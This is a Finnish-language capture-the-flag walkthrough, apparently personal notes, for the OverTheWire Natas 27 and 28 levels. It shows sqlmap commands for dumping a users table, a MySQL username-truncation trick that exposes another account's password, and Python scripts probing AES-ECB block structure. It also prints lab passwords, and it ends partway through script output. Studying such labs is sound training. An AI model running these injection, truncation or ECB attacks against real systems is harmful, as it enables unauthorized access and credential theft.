-d "password=abc123" \
http://natas27.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
User natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


testausta löytyykö injketiopiste

sqlmap -u "http://natas27.natas.labs.overthewire.org/" \
--auth-type Basic --auth-cred "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" \
--data "username=test&password=test" \
--batch --level=1 --risk=1 --identify-waf


jos injkeito löytyy niin lisätään tietokanna nimen: --dbs

jos tietokanta löytyy sitten lisätään perään: --tables -D <tietokannan_nimi>

ja viimeisenä dumppaus ulos jos löytyy ja lisätään perään: --dump -D <tietokanta> -T users






## ratkaisu osuus

Ratkaisu kohteena on siis käyttää se VARCHAR (64) merkkiä kokonaan ja jotenkin purkkaa se natas28 salasanansa ulos

1. Käytettään esim. käyttäjänimenä natas28 + paljon satunnaista täytettä (A, B, tms.) → esim. natas28AAAAAAAAAA...
2. Kun pituus ylittää 64 merkkiä, MySQL katkaisee sen tarkalleen 64 merkkiin.
3. Jos tämä katkaistu nimi vastaa täsmälleen oikeaa natas28, tietokanta ajattelee, että "tässä on toinen natas28".
4. Koska salasanaa ei tarkisteta kunnolla (tai käytetään väärää tarkistusta dumpissa), voit kirjautua sisään omalla salasanallasi ja saat näkyviin oikean natas28-käyttäjän salasanan.


kokeilin tunnuksella kuin (admin:admin) niin syötin tahallaan väärän salasanansa, niin antoi virallisen error - eli "admin" käyttäjälle syötetty väärä salasansa.

sama pätee tässä ei ole puhdas **ei ole puhdas SQL-injektio**, vaan perustuu **merkkijonon pituusrajoitukseen ja tietokannan käyttäytymiseen.**

Kokeillaan nyt: natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
salasana: natas

natas28           !
natas

Loin jonkun tunnarinsa natas28 (yksitoista välilyönti siis space) ja salasansa natas - se antoi "GO away hacker" - sekä testattu natas28AAAAAAAA..... jotakin ja syötin tahallaan väärä salasansa niin kertoi jotakin


Toiseksi huomioina jos yrittää esim. luoda alkuun (test:test), sitten arvella (natas28:<randomPassword>) - niin ei toimi, koska voi olla tämä natas27 taso on vähä parantunut - että jouduttaan leikkiä vaihteeksi burp suite uusiksi ja tai jos python koodilla niin sekin voi toimia.


natas28                                               a
abc123


Jos syötät käyttäjänimen, joka on täsmälleen 64 merkkiä pitkä, ja salasana mitä tahansa, tietokanta ei voi tallentaa uutta käyttäjää, koska käyttäjänimi on jo "täynnä".


natas28++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++x

natas28++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Tosiaan tämä osuus eli PHP-koodissa ja tämä tarkoittaa:

- Jos käyttäjänimessä on välilyöntejä alussa tai lopussa, sinut torpataan heti.
- `trim($user)` - poistaa alusta ja alopussa välilyöntejä
- jos alkuperäisen `$usr` siis käyttäjä ei ole sama kuin trimmattu versio sitten toistaa ton käskynsä. 

Tosiaan testattuna **natas28** ja 56 välilyöntiä --> tämä ehto tarkoittaa laukeaakseen, koska loppuu lisäntyvien välilyönnit poistetaan `trim()` - funktiolla.

```
if($usr != trim($usr)) {
    echo "Go away hacker";
    return False;
}
```



Tätä jotenkin loin ekaksi (test:test) tunnuksen sitten kirjautuu ekana sillä sisään ja onnistui, ja luodaan uusi tunnus (natas28 jolla on useita välilyöntiä) ja perään x . sekä salasana vaikappa "test" - luoneen jälkeen just tästä selaimesta peruuttaa taakse päin niin se tunnus pysyy ennallaan ja kumoaa perässä ton x sanan ja syöttää just se "test" salasansa niin sitten pääsee ja saada selvitettyä natas28 level salasansa.

se piti olla --> natas28 (57 välilyöntiä) ja peräsin perään x kirjaimen että tiedän mihin asti se päättyy

┌──(kali㉿kali)-[~]
└─$ echo -n "natas28" && printf ' %.0s' {1..57} && echo -n "x"
natas28                                                         x                                                                                 



# natas 28 - START HERE;

Welcome natas28 !
Here is your data:
Array ( [username] => natas28 [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj )


kirjoitin haku kenttään jotaikn satunnaista tekstiä ja sitten "search" nappia - jonka antoi tällaisen url (http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJyuJN4JsfEV0tjnwsT7stHKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D) - mahtaako tämä merkitä jotakin ja samahan sivusto muuttui ja tuli tälleinen otsikko (Whack Computer Joke Database).


jos haku kenttään ei syötä mitään niin suora "search" nappia niin antaa vihjeitä ja tämän vitsi tietokannan mikälie


jos syötän kenttään "joke" ja klikkasin "search" napin niin tuli tällainen:

Whack Computer Joke Database
I've got a really good UDP joke to tell you, but I don't know if you'll get it


Tosiaan hakukenttään jos syöttää virallista sanaa tai pari-muutama välilyöntiä se kertoo jonkun lyhyen vitsi - ja voi olla vain tietty sanat 


Muutamissa pisti tämä osuus ainakin.. -->"The first string says, "I think I'll have a beer quag fulk boorg jdk`^Xbasdh dsa 23^@!8"


Samahan haettusta search kentän jälkeen se antoi erillaisen URL - mutta pikaisella silmällä jotakin näyttää samalla ja kokonaisen URL parametri eivät ole identtinen. Tarkistettuna "query"= jälkeen tämä osuus näyttää samalla, mutta muuten loppu osa ei ole.. **Eroava osa on keskellä**, mikä viittaa siihen, että kyseessä voi olla esimerkiksi salatun datan eri lohkot

http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLeIxYTeJ%2F0dro1G9VaeLyzKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D


http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIQgA1C82eT1228lUHOW3X2KSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D

Tässä pari-muutamassa URL linkin kohdalla `search.php/` jälkeen jossa on kyselyä (query) jossa tulostaa jotakin tuntematonta tekstiä, ne on base64-enkoodattua stringiä


## Pieni teoria ja pohdinta

Tämä teoria ja ratkaisu osuus siis mitä tässä tapahtuu harjoituksen natas 28 levelissä on vähä muiden bloggien mukainen ohje, mutta kuulemma on yksi vaikeimmista tasoista.


Sivuston mukaan tekee kikkailun tekemän haun, se rakentaa siitä palvelimen puolella merkkijonon (jossa on vakio-alkuprefixi + käyttäjän syöte + mahdollinen suffiksi (muokkaa sanan merkitystä)), salaa sen **AES:llä ECB-tilassa**, **base64-koodaa** ja laittaa tuloksen **URL-parametriin**. Siksi alku pysyy samana (vakio‑prefixi → samat ensimmäiset lohkot), mutta keskiosa ja loppu muuttuvat, kun oma syötteesi ja pehmusteet vaihtuvat. ECB:ssä identtinen selkotekstilohko tuottaa aina identtisen salat ekstilohkon, ja se paljastaa rakennetta sekä mahdollistaa “cut‑and‑paste”‑kikkailun.


Sis mitä **ECB (Electronic Codebook) tarkoittaa**, miksi se on turvaton ja miten se liittyy Natas28-tasoon.

**🔐 Mikä on ECB-salaus?**
ECB (Electronic Codebook) on yksinkertaisin tapa käyttää lohkosalausta kuten AES:ää. Se toimii näin:

- Teksti jaetaan lohkoihin (yleensä 16 tavua = 128 bittiä).
- Jokainen lohko salataan erikseen samalla salausavaimella.
- Jos kaksi lohkoa ovat identtisiä, niiden salattu muoto on myös identtinen.



Just aikiasempi kappaleen mukaann 3 tai jopa muutamia testauksissa ja tarkistuksena, se antoi näitä arvoja, ja query (kyselystä) eteenpäin.

Tässä (alhaalla) muutama esim. jossa vakio-alku osa, keskellä on lomakekenttä syötteeni mitä syötetty käyttöliittymäsä ja perässä mahdollinen vakiosuffiksi tai pehmuste (padding). Tuosta "%2BJ2TdR0Qp8dcjP" suurinpirtein tässä alkaa leikkaa se keski-osa, joka muuttuu vähittelen.

- /search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJyuJN4JsfEV0tjnwsT7stHKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
- /search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLeIxYTeJ%2F0dro1G9VaeLyzKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D

- /search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIQgA1C82eT1228lUHOW3X2KSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D

- search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK%2FZEJpSw8lYr3%2BNDY3VpFZKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D


**🔍 Mitä tapahtuu, kun URL muuttuu “hieman”?**
Kyseessä on AES-ECB-salauksella koodattu kyselymerkkijono, joka voi sisältää:

- Vakio-alkuosan (esim. "query:" tai jotain backend-määrityksiä)
- Oma syötteesi (lomakekenttä)
- Mahdollinen vakiosuffiksi tai pehmuste (padding)

ECB-salaus ei sekoita lohkoja keskenään, vaan jokainen 16 tavun lohko salataan erikseen. Kun syötteesi menee keskelle lohkosarjaa, muuttuvat vain ne lohkot, jotka sisältävät syötteen, ei alku.


**Miksi URL-parametrin alku pysyy samana, mutta keskiosa ja loppu muuttuvat?**

- Vakio‑prefixi: Sovellus liittää syötteesi eteen kiinteän tekstin (esim. kyselypohjan). Tämä muodostaa ensimmäiset lohkot, jotka pysyvät samana → sama alku base64‑merkkijonossa.

- Syöte muuttaa seuraavia lohkoja: Kun muutat omaa tekstiäsi, nimenomaan ne lohkot, joissa syöte sijaitsee, vaihtuvat → keskiosa muuttuu.

- Pehmuste (PKCS#7) vaikuttaa loppuun: Pituuden muutos vaikuttaa viimeiseen lohkoon ja pehmusteeseen → loppu näyttää “täysin eri” jokaisella pituudella. Jos sotket tavumääriä, näet joskus “padding error” ‑tyyppisiä virheitä.


### vihjeenä ratkaisuun

**🧪 Miten testaus toimii CTF-logiikassa?**
Tee syötteitä, joissa on toistuvaa merkkijonoa (esim. AAAAAAAAAAAAAAAA x2). Jos näet URL:ssa toistuvan 24-merkkisen base64-pätkän → varmistus ECB:stä.

Lisää yksi merkki kerrallaan syötteeseen ja tarkkaile, milloin base64-pituus hyppää 24 merkkiä → se paljastaa uuden lohkon alun.

Kun saat “syötteen lohkon” kohdalle, voit kopioida sen base64:stä ja liittää toiseen kohtaan — testaa, mitä palvelin vastaa.


**💡 Lomakekenttä uudelleenkäyttö: mitä palvelin tekee?**
Vaikka URL-parametri muuttuu, palvelin todennäköisesti purkaa sen salatuksi kyselyksi ja käyttää sitä SQL- tai hakuoperaation syötteenä. Jos salattu syöte menee oikein lohkorajalle → koko "search string" saattaa sisältää esim. admin tai vastaavaa.


## testausta ja oma versio

natas28 [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj )

Eli tosiaan pitäisi saada joku toisto tai tiety merkintä esim. "AAAAAAAAAAAAAAAAA" tai jotakin - lohkoa tunnistamiseen ja kopioida sen, muuttaa ja kääntää sen salaiseksi muotoiseksi, jotta saadaan se **natas29** vastaus.

Tässä tehtävässä tapahtuu siis CTF-tehtävissä käyttäen "AAAAAAAAAAAAAAAA" eli juuri 16 A:ta (ei 15, ei 17) on täsmälleen yksi AES-lohko. Tämä ei ole sattumaa — se on strateginen tapa testata ja paljastaa salauksen toimintaa, erityisesti kun kyseessä on ECB-tila, joka on tunnettu siitä, että:

Identtinen selkotekstilohko → identtinen salattu lohko. Tämä on parempi malli: 
- `Default Prepended Text` + `Input text` + `Padding to match the predefined block size`

**🧪 Miksi ei riitä vain pari A:ta?**

- Jos käytät vain esim. "AAA" tai "AAAAAA", et täytä kokonaista lohkoa → lohko sisältää myös muuta dataa (prefixiä tai paddingia).

- Vasta kun täytät koko lohkon (16 merkkiä), saat puhtaan lohkon, jonka salattu muoto on toistettavissa ja tunnistettavissa.


Satunnaista testausta ainakin niin testattua - esim. etusivustolla syöttää jotakin niin joko antaa jonkun vitsin tai ei, niin kummosin perässä olevan parametri osuuden ja lisäsin `query=hello` eli hello - sanan niin tuli näin ja ainakin toimi: 

```
Notice: Trying to access array offset on value of type bool in /var/www/natas/natas28/search.php on line 59
Zero padding found instead of PKCS#7 padding
```
- Natas28 käyttää AES-ECB-salausta ja PKCS#7-paddingia. Kun syötät query=hello, se salataan, mutta jos yrität manipuloida base64-parametria ilman oikeaa paddingia, purku epäonnistuu.
- Tämä on todella tärkeä vihje: purku odotti PKCS#7-paddingia, mutta sai nollapaddingia.


### Python skripti - START HERE;

Kokeillaan joku python skripti - apua toisesta sivustolta. Python-skriptin, joka mittaa salatun datan pituuden kun syötteen pituus kasvaa. Tämä on juuri se, mitä tarvitaan ECB-salauksen lohkoanalyysiin. 1-32 merkkiä (syötteenpituus) tarkoittaa 160 tavua (salatun datan pituutta) ja 33-48 merkkiä (syötteenpituus) tarkoittaa 256 tavua (salatun datan pituus). Tässä nähdään milloin **uusi AES-lohko syntyy** ja näkee **PKCS#7 padding** vaikuttaa salauksen pituuteen. Tämä onkin testauksen automatisointi, että miten se palvelin reagoi ja nopeampaa kuin manuaalisen testausta selaimessa, ja vaikka ei anna ratkaisua silti pientä hyötyä on.

import requests
from urllib.parse import unquote
import binascii
import base64

url = "http://natas28.natas.labs.overthewire.org/index.php"
username = "natas28"
password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"

for i in range(1, 50):
    data = {"query": "a" * i}
    data_length = len(data['query'])
    res = requests.post(url=url, data=data, auth=(username, password))
    encrypted_raw = binascii.hexlify(base64.b64decode(unquote(res.url[60:]))).decode()
    encrypted_raw_length = len(encrypted_raw)
    print("input Length: " + str(data_length) + " Encrypted query Length: " + str(encrypted_raw_length))



┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi28.py
input Length: 1 Encrypted query Length: 160
input Length: 2 Encrypted query Length: 160
input Length: 3 Encrypted query Length: 160
input Length: 4 Encrypted query Length: 160
input Length: 5 Encrypted query Length: 160
input Length: 6 Encrypted query Length: 160
input Length: 7 Encrypted query Length: 160
input Length: 8 Encrypted query Length: 160
input Length: 9 Encrypted query Length: 160
input Length: 10 Encrypted query Length: 160
input Length: 11 Encrypted query Length: 160
input Length: 12 Encrypted query Length: 160
input Length: 13 Encrypted query Length: 192
input Length: 14 Encrypted query Length: 192
input Length: 15 Encrypted query Length: 192
input Length: 16 Encrypted query Length: 192
input Length: 17 Encrypted query Length: 192
input Length: 18 Encrypted query Length: 192
input Length: 19 Encrypted query Length: 192
input Length: 20 Encrypted query Length: 192
input Length: 21 Encrypted query Length: 192
input Length: 22 Encrypted query Length: 192
input Length: 23 Encrypted query Length: 192
input Length: 24 Encrypted query Length: 192
input Length: 25 Encrypted query Length: 192
input Length: 26 Encrypted query Length: 192
input Length: 27 Encrypted query Length: 192
input Length: 28 Encrypted query Length: 192
input Length: 29 Encrypted query Length: 224
input Length: 30 Encrypted query Length: 224
input Length: 31 Encrypted query Length: 224
input Length: 32 Encrypted query Length: 224
input Length: 33 Encrypted query Length: 224
input Length: 34 Encrypted query Length: 224
input Length: 35 Encrypted query Length: 224
input Length: 36 Encrypted query Length: 224
input Length: 37 Encrypted query Length: 224
input Length: 38 Encrypted query Length: 224
input Length: 39 Encrypted query Length: 224
input Length: 40 Encrypted query Length: 224
input Length: 41 Encrypted query Length: 224
input Length: 42 Encrypted query Length: 224
input Length: 43 Encrypted query Length: 224
input Length: 44 Encrypted query Length: 224
input Length: 45 Encrypted query Length: 256
input Length: 46 Encrypted query Length: 256
input Length: 47 Encrypted query Length: 256
input Length: 48 Encrypted query Length: 256
input Length: 49 Encrypted query Length: 256



Tässä on skripti, jossa tapahtuu AES-ECB-lohkojen analysointi


import requests
from urllib.parse import unquote
import binascii
import base64

url = "http://natas28.natas.labs.overthewire.org/index.php"
username = "natas28"
password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"

for i in range(1, 50):
    data = {"query": "a" * i}
    data_length = len(data['query'])
    res = requests.post(url=url, data=data, auth=(username, password))

    # Purkaa URL-parametrin base64-salauksen
    encrypted_raw = binascii.hexlify(base64.b64decode(unquote(res.url[60:]))).decode()
    encrypted_raw_length = len(encrypted_raw)

    print("input Length: " + str(data_length) + " Encrypted query Length: " + str(encrypted_raw_length) + "\n")

    # Tulostaa lohkot (32 heksamerkkiä = 16 tavua)
    block_size = 32
    for i in range(encrypted_raw_length // block_size):
        print(encrypted_raw[block_size * i : block_size * (i + 1)])

    print("=" * 40)



Aika pitkä tulostus ja täsä onmkin AES-ECB lohkoanalyysi dataa. Palvelin salaa syötteen AES-ECB:llä ja palauttaa sen base64-koodattuna URL-parametrina.
- Skripti purkaa base64:n ja näyttää salatun datan pituuden.
- Tulostaa salauksen lohkoittain (32 heksamerkkiä = 16 tavua).
- Näin voit tunnistaa toistuvat lohkot, rakentaa hyökkäyksen, ja murtaa salauksen rakenteen.




Nyt tässä , skripti purkaa base64:n ja näyttää salatun datan pituuden. ulostaa salauksen lohkoittain (32 heksamerkkiä = 16 tavua). Näin voidaan tunnistaa toistuvat lohkot, rakentaa hyökkäyksen, ja murtaa salauksen rakenteen.


Skriptin avulla havaitsin, että kohdasta **input Length: 10** alkaen **kolmas lohko alkaa toistua identtisesti**, kun syötteenä on toistuva merkkijono kuten "AAAAAAAAAA...". Tämä paljastaa ECB-salauksen rakenteen: identtinen syöte tuottaa identtisen salatun lohkon. Tästä eteenpäin voidaan rakentaa hyökkäys, jossa haluttu lohko (esim. "admin") liitetään toiseen salattuun syötteeseen. 

Sama pätee **input length 26** alkaen toistua sama osuus ja **neljäs lohko toistua identtisiä dataa** ja sama idea kohdalla **input length 41 ja 42** kohasta loppuun asti toistuu sama lohdo id.


┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi28-2.py   
input Length: 1 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
ab880a8f136fbeb98967891324a1b075
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================
input Length: 2 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
b130a531bec89c705213bfa5c9667ac7
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57
========================================
input Length: 3 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
2f5293a63acb9fe8c7b4e824b76d6a1d
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a
========================================
input Length: 4 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
3504a9a9675ffd614b4f1f90d284fcaa
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66
========================================
input Length: 5 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c36a1f0469158a3052166146a5e3f2ec
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b
========================================
input Length: 6 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
4a11ffe73afd15daa05eb3c3486dcde1
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a
========================================
input Length: 7 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
9fde1cef6e3f84a172633f3074fc8e18
6486954aea46fb93e9ab85845b4f4bd0
d7ff2b725453fc294701e51f5d7c0f8e
========================================
input Length: 8 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
453e0020602f4dccd50f0eb7709477c2 <<<<<<<<
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3
========================================
input Length: 9 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
9e622686a52640595706099abcb052bb <<<
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0
========================================
input Length: 10 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e <<<<<<<<<<<<<<<<
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702
========================================
input Length: 11 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e <<<<<<<<<<<<<<<<
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a
========================================
input Length: 12 Encrypted query Length: 160

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e <<<<<<<<<<<<<<<<
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 13 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98
========================================
input Length: 14 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8
========================================
input Length: 15 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4
========================================
input Length: 16 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda
========================================
input Length: 17 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================
input Length: 18 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
53d9499ebcad6861f04b7cdc24f30462
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57
========================================
input Length: 19 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
a549fda52b6d9b4e2632db31838856d5
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a
========================================
input Length: 20 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
2011bbe488dde1bbec961b6170b30e12
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66
========================================
input Length: 21 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
8829a1f930ceb566b834441c0577402c
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b
========================================
input Length: 22 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
547602b52fae1566ac8e971f91f6d605
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a
========================================
input Length: 23 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
a45a93ee4794d1b6204fb0920b68f27d
6486954aea46fb93e9ab85845b4f4bd0
d7ff2b725453fc294701e51f5d7c0f8e
========================================
input Length: 24 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
eda118f999f9495e8f3d973fba6528a3
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3
========================================
input Length: 25 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
f2909c4d53781ee1777a012bb1a72541
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0
========================================
input Length: 26 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3 <<<<<<<<<<<<<<<<
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702
========================================
input Length: 27 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3 <<<<<<<<<<<<<<<<
b4eda087d3c0bea2bedc1b6140b9e2eb
ca8cf4e610913abae39a067619204a5a
========================================
input Length: 28 Encrypted query Length: 192

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3 <<<<<<<<<<<<<<<<
ce82a9553b65b81280fb6d3bf2900f47
75fd5044fd063d26f6bb7f734b41c899
========================================
input Length: 29 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
1f74714d76fcc5d464c6a221e6ed98e4
6223a14d9c4291b98775b03fbc73d4ed
d8ae51d7da71b2b083d919a0d7b88b98
========================================
input Length: 30 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
ecd36f8fd9164d403540e449707d27e5
4257a343daadaaf2c0e3a1d71ce03dd1
7b7baca655f298a321e90e3f7a60d4d8
========================================
input Length: 31 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
5aef2a997da2363f72a3fad332d1736f
a773f3185094aa01408f1f97d037d385
678c5773ecc28f870e4f4ebc6c8070a4
========================================
input Length: 32 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
8925158cfc5ac06d22bfda0b72c8f151
a77e8ed1aabe0b5d05c4ffe6ac1423ab
478eb1a1fe261a2c6c15061109b3feda
========================================
input Length: 33 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
adf8a1ad0177ed1ecad3ac7c1082aa9e
bdfa1054ec68515cf96f2a5544591947
904f4b2abf2c2d7686aa72a53151c970
========================================
input Length: 34 Encrypted query Length: 224

1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
c0872dee8bc90b1156913b08a223a39e
b39038c28df79b65d26151df58f7eaa3
53d9499ebcad6861f04b7cdc24f30462
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57
========================================
input Length: 35 Encrypted query Length: 224

